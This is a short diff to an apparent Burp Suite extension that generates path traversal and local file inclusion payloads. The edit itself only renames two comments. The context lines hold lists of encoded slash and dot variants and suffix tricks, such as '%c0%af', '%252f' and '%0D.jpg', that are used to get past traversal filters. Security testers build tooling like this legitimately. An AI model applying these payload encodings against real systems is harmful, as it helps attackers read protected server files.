@@ -622,7 +622,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                 listLFI.append(_resultTxt + filePath + "%0D.jpg\n")
                 listLFI.append(_resultTxt + filePath + "%FF.jpg\n")
 
-                # backslash
+                # backslash combinations
                 # replace with /
                 delimetersSlash = ["%2f", "%252f", "%255c", "%c0%af", "%25c0%25af", "%c1%9c", "%25c1%259c", "%%32%66", "%%35%63", "/", "/", "/", "%u2215", "%u2216", "%uEFC8", "%uF025", "0x2f", "%c0%2f", "//", "///", "\\/", "\\/", "%uEFC8", "%uF025", "/\\", "/\\", "//", "%%32%66", "/"]
                 # replace with ..
@@ -637,7 +637,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                     listLFI.append((_resultTxt + filePath).replace("/", delimetersSlash[i]).replace("..", delimetersDots[i]) + "\n")
                 # backslash
 
-                # forward slash
+                # forward slash combinations
                 # # replace with \
                 delimetersSlash = ["%5c", "%255c", "\\", "\\", "\\", "\\\\", "%u2216", "0x5c", "%c0%5c", "\\\\", "\\\\\\", "\\", "\\", "\\", "\\", "\\", "\\", "\\", "%c1%9c", "\\"]
                 # replace with ..
